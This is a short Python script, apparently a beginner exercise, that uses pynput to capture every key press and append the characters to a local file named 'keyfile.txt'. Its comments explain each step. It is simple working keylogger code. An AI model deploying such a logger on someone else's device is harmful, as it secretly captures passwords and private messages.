from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", "a") as logkey: #making a new file to log the keys
        try:
            char = key.char #gets the character of the key
            logkey.write(char) #writes the character in the file

        except:
            print("Error in getting the char")


if __name__=="__main__":
    listener = keyboard.Listener(on_press=keyPressed) #initialises the keyboard listener and when a key is pressed, it launches the keypressed function
    listener.start()
    input()